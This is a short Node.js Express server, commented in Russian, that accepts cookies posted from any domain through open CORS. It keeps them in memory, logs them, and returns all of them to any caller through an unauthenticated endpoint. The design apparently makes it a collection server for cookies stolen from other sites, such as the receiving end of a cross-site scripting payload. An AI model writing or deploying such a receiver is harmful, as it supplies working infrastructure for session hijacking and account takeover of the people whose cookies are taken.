const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const app = express();
const port = 3000;

app.use(cors()); // Разрешаем запросы с других доменов
app.use(bodyParser.json()); // Для обработки JSON-данных

let userCookies = []; // Массив для хранения куки

// Маршрут для хранения куки
app.post('/api/store-cookies', (req, res) => {
    const { cookies } = req.body;
    userCookies.push(cookies);
    console.log('Cookies stored:', cookies);
    res.json({ status: 'success' });
});

// Маршрут для получения куки
app.get('/api/get-cookies', (req, res) => {
    res.json(userCookies);
});

app.listen(port, () => {
    console.log(`Server is running on http://localhost:${port}`);
});
